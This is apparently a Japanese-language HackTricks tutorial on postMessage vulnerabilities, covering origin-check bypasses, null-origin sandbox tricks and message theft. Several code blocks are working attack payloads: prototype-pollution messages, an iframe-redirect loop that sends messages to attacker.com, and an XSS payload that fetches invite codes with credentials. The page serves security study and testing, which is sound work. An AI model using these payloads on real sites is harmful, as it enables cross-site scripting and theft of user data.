# PostMessage脆弱性

## PostMessage脆弱性

<details>

<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**で**ゼロからヒーローまでのAWSハッキング**を学びましょう！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)をフォローする
- **ハッキングテクニックを共有するために、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)は、**ダークウェブ**を活用した検索エンジンで、企業やその顧客が**盗難マルウェア**によって**侵害**されていないかを確認する**無料**機能を提供しています。

WhiteIntelの主な目標は、情報窃取マルウェアによるアカウント乗っ取りやランサムウェア攻撃と戦うことです。

彼らのウェブサイトをチェックし、**無料**でエンジンを試すことができます：

{% embed url="https://whiteintel.io" %}

---

## **PostMessage**を送信する

**PostMessage**は、次の関数を使用してメッセージを送信します：
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
注意してください、**targetOrigin** は '\*' または _https://company.com_ のような URL になります。\
**第二のシナリオ**では、**メッセージはそのドメインにのみ送信**されます（たとえウィンドウオブジェクトのオリジンが異なっていても）。\
**ワイルドカード**が使用されると、**メッセージは任意のドメインに送信**され、ウィンドウオブジェクトのオリジンに送信されます。

### iframe と **targetOrigin** のワイルドカードへの攻撃

[**このレポート**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/)で説明されているように、**X-Frame-Header** 保護がないページを見つけ、**ワイルドカード** (\*) を使用して **postMessage** を介して **機密メッセージ** を送信している場合、**iframe** の **origin** を **変更**して、**機密** メッセージを自分が制御するドメインに **漏洩** させることができます。\
ページが iframed できる場合でも、**targetOrigin** が **URL に設定されていてワイルドカードではない**場合、この **トリックは機能しません**。
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListenerの悪用

**`addEventListener`**は、JSによって使用される関数で、**`postMessages`を受信する関数を宣言**するために使用されます。\
次のようなコードが使用されます：
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
### 列挙

現在のページで**イベントリスナーを見つける**には、以下を行うことができます：

- JSコードを検索して`window.addEventListener`と`$(window).on`（_JQueryバージョン_）を検索します
- 開発者ツールのコンソールで実行：`getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1).png>)

- ブラウザの開発者ツールで_Elements --> Event Listeners_に移動します

![](<../../.gitbook/assets/image (393).png>)

- [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta)や[https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker)のような**ブラウザ拡張機能**を使用します。これらのブラウザ拡張機能は**すべてのメッセージを傍受**して表示します。

### オリジンチェックの回避

- **`event.isTrusted`**属性は、本物のユーザーアクションによって生成されたイベントに対してのみ`True`を返すため、セキュアと見なされます。正しく実装されていればバイパスするのは難しいですが、セキュリティチェックにおける重要性は顕著です。
- PostMessageイベントでのオリジン検証に**`indexOf()`**を使用することはバイパスの可能性があります。この脆弱性を示す例は次のとおりです：

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
- `String.prototype.search()`の**`search()`**メソッドは正規表現を想定しており、文字列ではありません。正規表現以外のものを渡すと、暗黙のうちに正規表現に変換され、メソッドが潜在的にセキュリティリスクを生じる可能性があります。これは、正規表現では、ピリオド（.）がワイルドカードとして機能し、特別に作成されたドメインで検証をバイパスできるためです。例：

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
- `search()`と同様に、**`match()`**関数も正規表現を処理します。正規表現が適切に構築されていない場合、バイパスの可能性があります。
- `escapeHtml`関数は、文字をエスケープして入力を無害化することを意図しています。ただし、新しいエスケープされたオブジェクトを作成せず、既存のオブジェクトのプロパティを上書きします。この動作は悪用される可能性があります。特に、オブジェクトが操作され、その制御されたプロパティが`hasOwnProperty`を認識しないようにできる場合、`escapeHtml`は期待どおりに機能しません。以下の例で示されています：

- 期待される失敗：

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```
- エスケープのバイパス：

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

この脆弱性の文脈では、`File`オブジェクトは、読み取り専用の`name`プロパティを持つため、`escapeHtml`関数によって無害化されません。このプロパティは、テンプレートで使用されるときに`escapeHtml`関数によって無害化されず、潜在的なセキュリティリスクを引き起こす可能性があります。
- JavaScriptの`document.domain`プロパティは、ドメインを短縮するためにスクリプトによって設定でき、同じ親ドメイン内でより緩和された同一オリジンポリシーの適用を可能にします。

### e.origin == window.origin バイパス

%%%%%%を使用して**サンドボックス化されたiframe**にWebページを埋め込む場合、iframeのオリジンはnullに設定されることが重要です。これは、**sandbox属性**とそのセキュリティと機能への影響を考慮する際に特に重要です。

sandbox属性で**`allow-popups`**を指定すると、iframe内から開かれたポップアップウィンドウは親のサンドボックス制限を継承します。これは、ポップアップウィンドウのオリジンが同様に`null`に設定されるため、ポップアップウィンドウのオリジンが`null`になり、iframeのオリジンと一致する状況が生じます。

したがって、これらの条件下でポップアップが開かれ、iframeからポップアップに**`postMessage`**を使用してメッセージが送信されると、送信元と受信先の両方のオリジンが`null`に設定されます。この状況により、**`e.origin == window.origin`**がtrue（`null == null`）に評価されるため、iframeとポップアップは両方が`null`の同じオリジン値を共有しているためです。

詳細については、以下を**読んでください**：

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### e.sourceのバイパス

メッセージがスクリプトがリスニングしている同じウィンドウから送信されたかどうかを確認することが可能です（特に**ブラウザ拡張機能のContent Scripts**にとって興味深い）。
```javascript
// If it’s not, return immediately.
if( received_message.source !== window ) {
return;
}
```
**メッセージ**の**`e.source`**を**null**にすることができます。**iframe**を作成し、**postMessage**を**送信**して**すぐに削除**することで。

詳細は**こちらを参照:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Header バイパス

これらの攻撃を実行するためには、理想的には**被害者のウェブページ**を`iframe`内に配置できると良いでしょう。しかし、`X-Frame-Header`のようなヘッダーはその**動作**を**防ぐ**ことができます。\
そのようなシナリオでは、より洗練された攻撃を使用することができます。脆弱なウェブアプリケーションに新しいタブを開いて通信することができます。
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### メインページをブロックして子に送信されたメッセージを盗む

次のページでは、**データを送信する前にメインページをブロック**し、**子のiframe**に送信された**機密性の高いpostmessageデータ**を盗む方法を見ることができます。そして、**子のXSSを悪用**して、データが受信される前に**データを漏洩**させます：

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### iframeの場所を変更してメッセージを盗む

もし、X-Frame-Headerを持たないウェブページに別のiframeを含めることができる場合、その子iframeの場所を変更できます。そのため、**ワイルドカード**を使用して送信された**postmessage**を受信している場合、攻撃者はそのiframeの**オリジンを自分が制御するページに変更**し、メッセージを**盗む**ことができます：

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessageからPrototype Pollutionおよび/またはXSSへ

`postMessage`を介して送信されたデータがJSによって実行されるシナリオでは、**ページをiframe化**し、**prototype pollution/XSSを悪用**して、攻撃を`postMessage`を介して送信することができます。

**`postMessage`を介して非常によく説明されたXSSの例**は、[https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)で見つけることができます。

**Prototype Pollutionを悪用し、その後XSSを行う**ための攻撃例を示す、`iframe`への`postMessage`を介したエクスプロイトの例：
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
**さらに情報を得るには**：

* [**プロトタイプ汚染**](../deserialization/nodejs-proto-prototype-pollution/)に関するページへのリンク
* [**XSS**](../xss-cross-site-scripting/)に関するページへのリンク
* [**クライアントサイドのプロトタイプ汚染からXSSへ**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)に関するページへのリンク

## 参考文献

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* 練習用: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)は、**ダークウェブ**を活用した検索エンジンで、企業やその顧客が**スティーラマルウェア**によって**侵害**されていないかをチェックする**無料**機能を提供しています。

WhiteIntelの主な目標は、情報窃取マルウェアによるアカウント乗っ取りやランサムウェア攻撃と戦うことです。

彼らのウェブサイトをチェックし、**無料**でエンジンを試すことができます：

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**</strong>で**ゼロからヒーローまでのAWSハッキングを学ぶ**</summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>
